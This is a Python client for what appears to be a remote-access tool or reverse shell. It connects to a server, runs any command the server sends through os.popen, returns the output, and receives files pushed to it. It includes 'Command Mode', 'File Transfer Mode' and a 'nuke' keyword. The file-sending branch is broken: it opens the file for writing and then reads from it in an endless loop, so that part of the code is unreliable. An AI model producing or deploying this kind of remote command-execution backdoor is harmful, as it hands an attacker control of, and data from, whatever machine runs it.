
import socket
import ssl
import os

def  create_client(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # secure_socket = context.wrap_socket(client_socket, server_hostname=server_ip)
    client_socket.connect((server_ip, server_port))
    client_socket.send("<ON>".encode())
    while True:
        response = client_socket.recv(10240)
        if(response.decode()=="Command Mode"):
            response = client_socket.recv(10240)
            if response.decode().lower() == 'nuke':
                client_socket.send('nuke'.encode())
                break
            if response.decode().lower() == 'exit':
                client_socket.send('exit'.encode())
                continue
            
            output = os.popen(response.decode()).read()
            if output == "":
                output = "Command executed but no output returned."
            client_socket.send(output.encode('utf-8'))
        if response.decode() == "File Transfer Mode":
            while True:
                response = client_socket.recv(10240)
                command = response.decode().strip().lower()
                

                if command == 'nuke':
                    client_socket.send('nuke'.encode())
                    break
                elif command == 'exit':
                    client_socket.send('exit'.encode())
                    continue
                elif command.startswith('send'):
                    try:
                        
                        _, file_name = command.split(" ", 1)
                                    # Check if the file already exists to avoid overwriting
                        if not os.path.exists(file_name):
                            client_socket.send("READY".encode())
                           

                            with open(file_name, "wb") as file:
                                while True:
                                    chunk = client_socket.recv(1024)
                                    if b"DONE" in chunk:
                                        file.write(chunk.split(b"DONE")[0])
                                        break
                                    file.write(chunk)
                            
                            continue
                        else:
                            client_socket.send(f"File '{file_name}' already exists.".encode())
                            print(f"File '{file_name}' already exists. Informing the server.")
                    except Exception as e:
                        client_socket.send(f"Error: {e}".encode())
                elif command.startswith('recv'):
                    try:
                        _, file_name = command.split(" ", 1)
                        client_socket.send("READY".encode())
                        with open(file_name, "wb") as file:
                            while True:
                              while chunk := file.read(1024):
                                client_socket.send(chunk)
                            client_socket.send("DONE".encode())
                    except Exception as e:
                        client_socket.send(f"Error: {e}".encode())
                else:
                    output = os.popen(command).read()
                    if not output:
                        output = "Command executed but no output returned."
                    client_socket.send(output.encode('utf-8'))
    
        

    


    

if __name__ == "__main__":
    create_client("127.0.0.1", 9999)
